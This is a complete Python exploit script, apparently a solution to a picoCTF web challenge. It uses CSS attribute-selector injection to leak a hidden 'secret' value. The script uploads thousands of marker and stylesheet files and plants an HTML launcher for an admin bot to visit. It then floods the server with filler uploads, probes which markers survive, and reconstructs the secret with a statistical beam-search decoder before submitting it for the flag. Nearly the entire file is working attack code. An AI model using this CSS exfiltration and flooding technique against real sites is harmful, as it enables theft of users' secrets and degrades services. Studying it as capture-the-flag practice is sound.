#!/usr/bin/env python3
import concurrent.futures
import itertools
import math
import random
import re
import string
import threading
import time
from collections import Counter
from dataclasses import dataclass
from typing import Iterable

import requests
import urllib3
from requests.adapters import HTTPAdapter

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HEX = "0123456789abcdef"
_TLS = threading.local()


@dataclass
class Marker:
    label: str
    paper_id: int
    var_name: str


def now() -> float:
    return time.time()


def elapsed_since(t0: float) -> float:
    return now() - t0


def new_session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    adapter = HTTPAdapter(pool_connections=2048, pool_maxsize=2048, max_retries=0)
    s.mount("https://", adapter)
    s.mount("http://", adapter)
    return s


def thread_session() -> requests.Session:
    s = getattr(_TLS, "session", None)
    if s is None:
        s = new_session()
        _TLS.session = s
    return s


def split_replica_label(label: str) -> tuple[str, int]:
    m = re.match(r"^(.*)__r(\d+)$", label)
    if not m:
        return label, 0
    return m.group(1), int(m.group(2))


def safe_var_name(raw: str) -> str:
    out = []
    for ch in raw:
        if ch in string.ascii_letters + string.digits + "_-":
            out.append(ch)
        else:
            out.append("_")
    return "u_" + "".join(out)


def chunked(items: list, size: int) -> Iterable[list]:
    for i in range(0, len(items), size):
        yield items[i : i + size]


def make_base_labels(ctrl_true: int, ctrl_false: int) -> list[str]:
    labels: list[str] = []
    labels += [f"p1_{c}" for c in HEX]
    labels += [f"s1_{c}" for c in HEX]
    labels += [f"p2_{a}{b}" for a, b in itertools.product(HEX, repeat=2)]
    labels += [f"s2_{a}{b}" for a, b in itertools.product(HEX, repeat=2)]
    labels += [f"bg_{a}{b}" for a, b in itertools.product(HEX, repeat=2)]
    labels += [f"tg_{a}{b}{c}" for a, b, c in itertools.product(HEX, repeat=3)]
    labels += [f"ctT_{i:03d}" for i in range(ctrl_true)]
    labels += [f"ctF_{i:03d}" for i in range(ctrl_false)]
    return labels


def make_labels(ctrl_true: int, ctrl_false: int, replicas: int, seed: int) -> list[str]:
    base_labels = make_base_labels(ctrl_true, ctrl_false)
    labels: list[str] = []
    for b in base_labels:
        for r in range(replicas):
            labels.append(f"{b}__r{r}" if replicas > 1 else b)
    random.Random(seed).shuffle(labels)
    return labels


def selector_for_label(label: str) -> str:
    b, _ = split_replica_label(label)
    if b.startswith("p1_"):
        return f'body[secret^="{b[3:]}"]'
    if b.startswith("s1_"):
        return f'body[secret$="{b[3:]}"]'
    if b.startswith("p2_"):
        return f'body[secret^="{b[3:]}"]'
    if b.startswith("s2_"):
        return f'body[secret$="{b[3:]}"]'
    if b.startswith("bg_"):
        return f'body[secret*="{b[3:]}"]'
    if b.startswith("tg_"):
        return f'body[secret*="{b[3:]}"]'
    if b.startswith("ctT_"):
        return "body[secret]"
    if b.startswith("ctF_"):
        return 'body[secret*="ggg"]'
    raise ValueError(f"unsupported label: {label}")


def upload_raw(
    session: requests.Session | None,
    base: str,
    content_type: bytes,
    body: bytes,
    filename: str = "x.txt",
    boundary: bytes = b"----ROBUSTBOUNDARY",
    retries: int = 1,
    timeout: float = 20.0,
) -> int | None:
    data = (
        b"--"
        + boundary
        + b"\r\n"
        + b"Content-Type: "
        + content_type
        + b"\r\n"
        + b'Content-Disposition: form-data; name="file"; filename="'
        + filename.encode()
        + b'"\r\n'
        + b"\r\n"
        + body
        + b"\r\n--"
        + boundary
        + b"--\r\n"
    )

    for attempt in range(retries + 1):
        sess = session or thread_session()
        try:
            r = sess.post(
                f"{base}/upload",
                data=data,
                headers={"Content-Type": "multipart/form-data; boundary=----ROBUSTBOUNDARY"},
                allow_redirects=False,
                timeout=timeout,
            )
            m = re.search(r"/paper/(\d+)", r.headers.get("Location", ""))
            if m:
                return int(m.group(1))
        except Exception:
            pass
        if attempt < retries:
            time.sleep(0.05 * (2 ** attempt))
    return None


def upload_markers(base: str, labels: list[str], marker_size: int, workers: int) -> list[Marker]:
    payload = b"M" * marker_size

    def do_one(pair: tuple[int, str]) -> tuple[int, Marker | None]:
        i, label = pair
        pid = upload_raw(
            session=None,
            base=base,
            content_type=b"text/plain",
            body=payload,
            filename=f"{label}.txt",
            timeout=12.0,
            retries=1,
        )
        if pid is None:
            return i, None
        return i, Marker(label=label, paper_id=pid, var_name=safe_var_name(f"{i}_{label}"))

    indexed: list[tuple[int, Marker]] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(do_one, (i, label)) for i, label in enumerate(labels)]
        for done, fut in enumerate(concurrent.futures.as_completed(futs), start=1):
            try:
                i, marker = fut.result()
            except Exception:
                i, marker = -1, None
            if marker is not None:
                indexed.append((i, marker))
            if done % 200 == 0 or done == len(labels):
                print(f"[+] markers uploaded: {done}/{len(labels)}")
    indexed.sort(key=lambda x: x[0])
    return [m for _, m in indexed]


def build_css(markers: list[Marker], trigger_id: str) -> bytes:
    lines: list[str] = []
    for m in markers:
        lines.append(f"{selector_for_label(m.label)}{{--{m.var_name}:url('/paper/{m.paper_id}');}}")
    var_list = ",".join(f"var(--{m.var_name},none)" for m in markers)
    lines.append(f"#{trigger_id}{{background-image:{var_list};width:1px;height:1px;}}")
    return ("\n".join(lines)).encode()


def upload_css_bundle(session: requests.Session, base: str, markers: list[Marker], per_css: int) -> list[int]:
    out: list[int] = []
    for idx, group in enumerate(chunked(markers, per_css)):
        pid = upload_raw(
            session=session,
            base=base,
            content_type=b"text/css",
            body=build_css(group, f"trig{idx}"),
            filename=f"oracle_{idx}.css",
            timeout=12.0,
            retries=1,
        )
        if pid is None:
            print(f"[warn] css chunk upload failed: {idx}")
            continue
        out.append(pid)
    return out


def upload_launcher(session: requests.Session, base: str, css_ids: list[int]) -> int | None:
    links = "".join(f"<link rel='stylesheet' href='/paper/{pid}'>" for pid in css_ids)
    triggers = "".join(f"<div id='trig{i}' style='width:1px;height:1px'></div>" for i in range(len(css_ids)))
    payload = links + triggers
    secret_url = "/secret?payload=" + requests.utils.quote(payload, safe="")
    html = ("<!doctype html><meta http-equiv='refresh' content='0;url=" + secret_url + "'><title>x</title>").encode()
    return upload_raw(session, base, b"text/html", html, filename="launcher.html", timeout=12.0, retries=1)


def upload_filler_fixed(base: str, count: int, filler_size: int, workers: int, timeout: float, retries: int, tag: str) -> tuple[int, int]:
    payload = b"F" * filler_size

    def do_one(i: int) -> bool:
        pid = upload_raw(
            session=None,
            base=base,
            content_type=b"text/plain",
            body=payload,
            filename=f"{tag}_{i}.bin",
            timeout=timeout,
            retries=retries,
        )
        return pid is not None

    ok = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(do_one, i) for i in range(count)]
        for done, fut in enumerate(concurrent.futures.as_completed(futs), start=1):
            try:
                ok += 1 if fut.result() else 0
            except Exception:
                pass
            if done % 200 == 0 or done == count:
                print(f"[+] {tag} uploaded: {done}/{count} ok={ok}")
    return ok, count


def probe_markers(base: str, markers: list[Marker], workers: int, timeout: float) -> list[Marker]:
    def do_one(m: Marker) -> Marker | None:
        try:
            r = thread_session().get(f"{base}/paper/{m.paper_id}", timeout=timeout)
        except Exception:
            return None
        if r.status_code == 200 and r.content != b"not found!":
            return m
        return None

    out: list[Marker] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(do_one, m) for m in markers]
        for done, fut in enumerate(concurrent.futures.as_completed(futs), start=1):
            try:
                m = fut.result()
            except Exception:
                m = None
            if m is not None:
                out.append(m)
            if done % 500 == 0 or done == len(markers):
                print(f"[+] probed markers: {done}/{len(markers)}")
    return out


def age_rank_map(markers: list[Marker]) -> dict[int, int]:
    ordered = sorted(markers, key=lambda m: m.paper_id)
    return {m.paper_id: i for i, m in enumerate(ordered)}


def build_age_model(markers: list[Marker], alive_ids: set[int], bins: int) -> dict[str, list[float] | list[int]]:
    rank_by_id = age_rank_map(markers)
    max_rank = max(rank_by_id.values()) if rank_by_id else 0
    scale = max(1, max_rank + 1)

    def to_bin(marker: Marker) -> int:
        rank = rank_by_id[marker.paper_id]
        b = rank * bins // scale
        return max(0, min(b, bins - 1))

    t_total = [0] * bins
    t_alive = [0] * bins
    f_total = [0] * bins
    f_alive = [0] * bins
    for m in markers:
        base_label, _ = split_replica_label(m.label)
        b = to_bin(m)
        alive = 1 if m.paper_id in alive_ids else 0
        if base_label.startswith("ctT_"):
            t_total[b] += 1
            t_alive[b] += alive
        elif base_label.startswith("ctF_"):
            f_total[b] += 1
            f_alive[b] += alive

    p_t_global = (sum(t_alive) + 1) / (sum(t_total) + 2)
    p_f_global = (sum(f_alive) + 1) / (sum(f_total) + 2)
    p_t = []
    p_f = []
    for b in range(bins):
        pt = (t_alive[b] + 1) / (t_total[b] + 2) if t_total[b] else p_t_global
        pf = (f_alive[b] + 1) / (f_total[b] + 2) if f_total[b] else p_f_global
        p_t.append(min(max(pt, 1e-4), 1 - 1e-4))
        p_f.append(min(max(pf, 1e-4), 1 - 1e-4))
    return {"p_t": p_t, "p_f": p_f, "max_rank": [max_rank]}


def per_label_llr_from_age_model(markers: list[Marker], alive_ids: set[int], bins: int, model: dict[str, list[float] | list[int]]) -> dict[str, float]:
    rank_by_id = age_rank_map(markers)
    max_rank = int(model["max_rank"][0])
    scale = max(1, max_rank + 1)
    p_t = model["p_t"]
    p_f = model["p_f"]

    def to_bin(marker: Marker) -> int:
        rank = rank_by_id[marker.paper_id]
        b = rank * bins // scale
        return max(0, min(b, bins - 1))

    out: dict[str, float] = {}
    for m in markers:
        label_base, _ = split_replica_label(m.label)
        if label_base.startswith("ctT_") or label_base.startswith("ctF_"):
            continue
        b = to_bin(m)
        alive = m.paper_id in alive_ids
        pt_alive = float(p_t[b])
        pf_alive = float(p_f[b])
        pt = pt_alive if alive else (1.0 - pt_alive)
        pf = pf_alive if alive else (1.0 - pf_alive)
        llr = math.log(max(pt, 1e-9)) - math.log(max(pf, 1e-9))
        out[label_base] = out.get(label_base, 0.0) + llr
    return out


def build_count_llr(base_counts: Counter[str], replicas: int, ctrl_true: int, ctrl_false: int) -> tuple[list[float], float, float, list[int], list[int]]:
    t_hist = [0] * (replicas + 1)
    f_hist = [0] * (replicas + 1)
    for i in range(ctrl_true):
        t_hist[min(base_counts.get(f"ctT_{i:03d}", 0), replicas)] += 1
    for i in range(ctrl_false):
        f_hist[min(base_counts.get(f"ctF_{i:03d}", 0), replicas)] += 1
    t_total = sum(t_hist) + (replicas + 1)
    f_total = sum(f_hist) + (replicas + 1)
    t_prob = [(x + 1) / t_total for x in t_hist]
    f_prob = [(x + 1) / f_total for x in f_hist]
    llr = [math.log(t_prob[k]) - math.log(f_prob[k]) for k in range(replicas + 1)]
    true_mean = sum(k * t_hist[k] for k in range(replicas + 1)) / max(1, sum(t_hist))
    false_mean = sum(k * f_hist[k] for k in range(replicas + 1)) / max(1, sum(f_hist))
    return llr, true_mean, false_mean, t_hist, f_hist


def combine_scores(base_counts: Counter[str], replicas: int, count_llr: list[float], age_scores: dict[str, float], clip: float) -> dict[str, float]:
    out: dict[str, float] = {}
    for label, k in base_counts.items():
        if label.startswith("ctT_") or label.startswith("ctF_"):
            continue
        out[label] = count_llr[min(k, replicas)]
    for label, score in age_scores.items():
        out[label] = out.get(label, count_llr[0]) + score
    if clip > 0:
        out = {k: max(-clip, min(clip, v)) for k, v in out.items()}
    return out


def weighted_score_maps(base_scores: dict[str, float]):
    p1: dict[str, float] = {}
    s1: dict[str, float] = {}
    p2: dict[str, float] = {}
    s2: dict[str, float] = {}
    bg: dict[str, float] = {}
    tg: dict[str, float] = {}
    for c in HEX:
        p1[c] = float(base_scores.get(f"p1_{c}", 0.0))
        s1[c] = float(base_scores.get(f"s1_{c}", 0.0))
    for a, b in itertools.product(HEX, repeat=2):
        s = a + b
        p2[s] = float(base_scores.get(f"p2_{s}", 0.0))
        s2[s] = float(base_scores.get(f"s2_{s}", 0.0))
        bg[s] = float(base_scores.get(f"bg_{s}", 0.0))
    for a, b, c in itertools.product(HEX, repeat=3):
        s = a + b + c
        tg[s] = float(base_scores.get(f"tg_{s}", 0.0))
    return p1, s1, p2, s2, bg, tg


def decode_candidates_beam(p1, s1, p2, s2, bg, tg, beam_width: int, top_k: int) -> list[tuple[float, str]]:
    rep_pen_bg = 0.2
    rep_pen_tg = 0.2
    beams: list[tuple[float, str, int, int]] = []
    for a, b, c in itertools.product(HEX, repeat=3):
        s2a = a + b
        s2b = b + c
        tri = a + b + c
        bg_mask = (1 << int(s2a, 16)) | (1 << int(s2b, 16))
        tg_mask = 1 << int(tri, 16)
        score = p1[a] + p2[s2a] + bg[s2a] + bg[s2b] + tg[tri]
        beams.append((score, tri, bg_mask, tg_mask))
    beams.sort(reverse=True, key=lambda x: x[0])
    beams = beams[:beam_width]

    for _ in range(29):
        nxt: list[tuple[float, str, int, int]] = []
        for score, seq, bg_mask, tg_mask in beams:
            a, b = seq[-2], seq[-1]
            for c in HEX:
                tri = a + b + c
                bg2 = b + c
                tri_idx = int(tri, 16)
                bg_idx = int(bg2, 16)
                tri_bit = 1 << tri_idx
                bg_bit = 1 << bg_idx
                ns = score
                n_bg_mask = bg_mask
                n_tg_mask = tg_mask
                if tg_mask & tri_bit:
                    ns -= rep_pen_tg
                else:
                    ns += tg[tri]
                    n_tg_mask |= tri_bit
                if bg_mask & bg_bit:
                    ns -= rep_pen_bg
                else:
                    ns += bg[bg2]
                    n_bg_mask |= bg_bit
                nxt.append((ns, seq + c, n_bg_mask, n_tg_mask))
        nxt.sort(reverse=True, key=lambda x: x[0])
        beams = nxt[:beam_width]

    final: list[tuple[float, str]] = []
    for score, seq, _, _ in beams:
        final.append((score + s1[seq[-1]] + s2[seq[-2:]], seq))
    final.sort(reverse=True, key=lambda x: x[0])

    out: list[tuple[float, str]] = []
    seen: set[str] = set()
    for score, seq in final:
        if seq in seen:
            continue
        seen.add(seq)
        out.append((score, seq))
        if len(out) >= top_k:
            break
    return out


def strong_enough_run(true_mean: float, false_mean: float, count_llr: list[float]) -> bool:
    return (true_mean - false_mean) >= 0.55 and count_llr[-1] > 1.0 and count_llr[0] < -0.8


def main() -> None:
    base = "https://lonely-island.picoctf.net:58697"
    seed = 1337
    ctrl_true = 64
    ctrl_false = 64
    replicas = 2
    marker_size = 2048
    marker_workers = 96
    per_css = 220

    prefill = 4200
    prefill_workers = 48
    refresh_css_launcher = True

    wait = 4.0
    flood = 1400
    flood_workers = 80
    flood_timeout = 6.0
    flood_retries = 0

    control_probe_workers = 512
    control_probe_timeout = 1.2
    probe_workers = 1400
    probe_timeout = 1.2
    beam_width = 3000
    top_k = 40
    bins = 24
    clip = 3.0
    secret_budget = 58.0
    submit_flag = True

    base = base.rstrip("/")
    session = new_session()

    labels = make_labels(ctrl_true, ctrl_false, replicas, seed)
    print(f"[+] labels total: {len(labels)}")

    print("[+] uploading markers...")
    markers = upload_markers(base, labels, marker_size, marker_workers)
    print(f"[+] markers uploaded: {len(markers)}")
    if not markers:
        return

    print("[+] uploading css bundles...")
    css_ids = upload_css_bundle(session, base, markers, per_css)
    print(f"[+] css papers: {len(css_ids)}")
    if not css_ids:
        return

    print("[+] uploading launcher...")
    launcher_id = upload_launcher(session, base, css_ids)
    print(f"[+] launcher id: {launcher_id}")
    if launcher_id is None:
        return

    print(f"[+] prefill={prefill} workers={prefill_workers}")
    ok, submitted = upload_filler_fixed(base, prefill, 65300, prefill_workers, 10.0, 0, "prefill")
    print(f"[+] prefill complete ok={ok}/{prefill} submitted={submitted}")

    if refresh_css_launcher:
        print("[+] refreshing css bundles + launcher post-prefill...")
        css_ids = upload_css_bundle(session, base, markers, per_css)
        print(f"[+] refreshed css papers: {len(css_ids)}")
        new_launcher = upload_launcher(session, base, css_ids)
        if new_launcher is not None:
            launcher_id = new_launcher
        print(f"[+] refreshed launcher id: {launcher_id}")

    print("[+] waiting for bot availability...")
    for _ in range(240):
        try:
            r = session.get(f"{base}/visit/999999999", timeout=6)
            if "browser still open" not in r.text:
                break
        except Exception:
            pass
        time.sleep(1)

    rv = session.get(f"{base}/visit/{launcher_id}", timeout=10)
    print(f"[+] /visit/{launcher_id}: {rv.text.strip()!r}")
    if "visiting!" not in rv.text:
        return

    visit_t0 = now()
    time.sleep(wait)
    print(f"[+] post-visit wait: {wait:.1f}s (elapsed={elapsed_since(visit_t0):.2f}s)")

    print(f"[+] flood={flood} workers={flood_workers}")
    flood_ok, _ = upload_filler_fixed(base, flood, 65300, flood_workers, flood_timeout, flood_retries, "flood")
    print(f"[+] flood done ok={flood_ok}/{flood} (elapsed={elapsed_since(visit_t0):.2f}s)")

    controls = [m for m in markers if split_replica_label(m.label)[0].startswith("ctT_") or split_replica_label(m.label)[0].startswith("ctF_")]
    alive_controls = probe_markers(base, controls, control_probe_workers, control_probe_timeout)
    control_counts: Counter[str] = Counter(split_replica_label(m.label)[0] for m in alive_controls)
    count_llr, true_mean, false_mean, t_hist, f_hist = build_count_llr(control_counts, replicas, ctrl_true, ctrl_false)
    print("[+] control true hist:", t_hist)
    print("[+] control false hist:", f_hist)
    print("[+] llr by count:", [round(x, 3) for x in count_llr])
    print(f"[+] control means: true={true_mean:.3f} false={false_mean:.3f}")
    if not strong_enough_run(true_mean, false_mean, count_llr):
        print("[!] controls indicate a weak/noisy run; retry")
        return

    raw_alive = probe_markers(base, markers, probe_workers, probe_timeout)
    print(f"[+] raw alive markers: {len(raw_alive)}/{len(markers)}")
    print(f"[+] probe done (elapsed={elapsed_since(visit_t0):.2f}s)")

    alive_ids = {m.paper_id for m in raw_alive}
    base_counts: Counter[str] = Counter(split_replica_label(m.label)[0] for m in raw_alive)
    count_llr, true_mean, false_mean, t_hist, f_hist = build_count_llr(base_counts, replicas, ctrl_true, ctrl_false)
    print("[+] control true hist:", t_hist)
    print("[+] control false hist:", f_hist)
    print("[+] llr by count:", [round(x, 3) for x in count_llr])
    print(f"[+] control means: true={true_mean:.3f} false={false_mean:.3f}")

    age_model = build_age_model(markers, alive_ids, bins)
    age_scores = per_label_llr_from_age_model(markers, alive_ids, bins, age_model)
    base_scores = combine_scores(base_counts, replicas, count_llr, age_scores, clip)

    p1, s1, p2, s2, bg, tg = weighted_score_maps(base_scores)
    ranked = decode_candidates_beam(p1, s1, p2, s2, bg, tg, beam_width=beam_width, top_k=top_k)
    print(f"[+] decoded candidates: {len(ranked)}")
    for score, cand in ranked[:20]:
        print(f"{score:.3f} {cand}")

    if submit_flag and ranked:
        elapsed = elapsed_since(visit_t0)
        if elapsed > secret_budget:
            print(f"[!] budget exceeded before submit: {elapsed:.2f}s > {secret_budget:.2f}s")
            return
        guess = ranked[0][1]
        print(f"[+] submitting top candidate at {elapsed:.2f}s: {guess}")
        r = session.get(f"{base}/flag?secret={guess}", timeout=10)
        print(f"[+] /flag response: {r.text!r}")
        if "picoCTF{" in r.text:
            print("[+] SUCCESS!")
        else:
            print("[!] FAILED - wrong secret")


if __name__ == "__main__":
    main()
